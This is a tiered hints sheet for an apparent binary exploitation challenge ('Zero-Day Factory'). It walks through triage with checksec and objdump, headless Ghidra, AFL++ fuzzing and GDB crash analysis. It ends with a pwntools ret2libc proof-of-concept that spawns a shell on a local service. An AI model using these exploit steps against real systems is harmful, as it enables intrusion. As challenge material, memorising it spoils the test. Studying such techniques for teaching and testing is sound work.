# Zero-Day Factory — Hints

> Each tier costs score points. Only request a hint when you are genuinely stuck.

---

## Tier 1 — Conceptual Direction (-5% score penalty)

Without source code, vulnerability discovery follows two complementary strategies: **static analysis** (examine the disassembly to find patterns associated with memory corruption — unsafe library calls, missing bounds checks, pointer arithmetic without validation) and **dynamic testing** (feed the running binary inputs that stress boundary conditions and observe crashes). The best results come from combining both: use static analysis to identify *where* vulnerabilities are likely to be (which functions, which code paths), then use fuzzing or symbolic execution targeted at those specific code paths to *confirm* them with a crashing input. Once you have a crash, use a debugger to determine whether the instruction pointer is controllable (exploitable) or not.

---

## Tier 2 — Technique Guidance (-10% score penalty)

- **Binary analysis**: Use **Ghidra** (free, headless mode available for automation) or **Rizin/Cutter** to decompile functions. The decompiler output is imperfect but good enough to spot `memcpy(dst, src, user_controlled_len)` patterns. Use the **xref** feature to trace all callers of `strcpy`, `gets`, `sprintf`, `scanf`, `memcpy`, `malloc`, `free` — these are the highest-priority manual review targets.
- **Coverage-guided fuzzing**: **AFL++ in QEMU mode** requires no source code and no instrumentation. It monitors which basic blocks are hit and mutates inputs to maximize coverage. Run with a small seed corpus (a few valid protocol messages). For network services, use `afl-fuzz` with `AFL_PRELOAD=libdesock.so` to redirect network I/O to stdin/stdout, or use **AFLNet** which is designed for network protocols.
- **Symbolic execution**: **angr** (Python library) can perform concolic execution on stripped x86-64 ELFs. Use `angr.Project(binary, auto_load_libs=False)` and set `find=` to the crash address identified by fuzzing. Angr will generate a concrete input that reaches that address. This is powerful for bypassing complex input checks that fool pure fuzzers.
- **Exploit primitives**: With ASLR disabled, the three most common primitives are: (1) **ret2libc** — overwrite return address with `system` PLT address, place `/bin/sh` string in a known location; (2) **ret2plt** — call `puts` to leak an address, then use the leak for further exploitation; (3) **format string write** — use `%n` in `printf` to write an arbitrary 4-byte value to an arbitrary address.

---

## Tier 3 — Implementation Guidance (-15% score penalty)

**Step 1 — Automated binary triage (run first, takes 5 minutes):**
```bash
for b in binaries/bin*; do
  checksec --file=$b      # shows NX, RELRO, stack canary, PIE
  objdump -d $b | grep -E "call.*(gets|strcpy|sprintf|scanf|system)" | head -20
  strings $b | grep -E "/bin/sh|/tmp|exec|system"
done
```
This immediately reveals: whether NX is enabled (affects exploit technique), the presence of unsafe functions (likely vuln locations), and any useful strings already in the binary.

**Step 2 — Headless Ghidra disassembly:**
```bash
$GHIDRA_HOME/support/analyzeHeadless /tmp/proj MyProject \
  -import binaries/bin1 \
  -postScript PrintFunctionNames.java > bin1_functions.txt
# Then use GhidraScript or Python bindings to extract CFG and data flow
```
For each function touching network input, check: (a) is the destination buffer size fixed? (b) is the copy length user-controlled? (c) is there an `if (len > MAX)` check before the copy?

**Step 3 — AFL++ QEMU fuzzing setup:**
```bash
pip install unicornafl  # for faster QEMU emulation
# For each binary in parallel:
mkdir -p corpus findings/bin1
echo "AAAA" > corpus/seed1
AFL_SKIP_CPUFREQ=1 afl-fuzz -Q -i corpus -o findings/bin1 \
  -t 5000 -- ./binaries/bin1 @@
```
After ~20 minutes, `findings/bin1/crashes/` will contain inputs that crash the binary. Replay each crash under GDB to classify it.

**Step 4 — Crash triage with GDB + pwndbg:**
```bash
pip install pwntools
gdb -q ./binaries/bin1
(gdb) run < findings/bin1/crashes/id:000000
(gdb) info registers rip rsp rbp
(gdb) x/20xg $rsp
```
If `RIP` contains bytes from your input (`0x4141414141414141` = "AAAAAAAA"), it is a controlled hijack — Critical. If it is an invalid address not from your input, it may still be exploitable with more analysis.

**Step 5 — Writing the PoC exploit with pwntools:**
```python
from pwn import *
elf    = ELF("binaries/bin1")
libc   = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p      = remote("localhost", 9001)  # or process(...)

offset = 64        # bytes to reach return address — find with cyclic(200) + cyclic_find(core.read(rsp, 8))
system = elf.plt["system"]          # PLT stub for system()
bin_sh = next(elf.search(b"/bin/sh"))  # address of "/bin/sh" in binary

payload = b"A" * offset + p64(elf.address + ROP_POP_RDI) + p64(bin_sh) + p64(system)
p.sendline(payload)
p.interactive()
```

**Step 6 — Reporting** — For each vulnerability include:
- Binary name, function name, virtual address (from Ghidra/rizin)
- Vulnerability type (from the fixed type list)
- Whether a working exploit was produced
- CVSSv3 severity (use online calculator) based on: network-reachable, low complexity, no privileges required = CVSS 9.8 for most of these
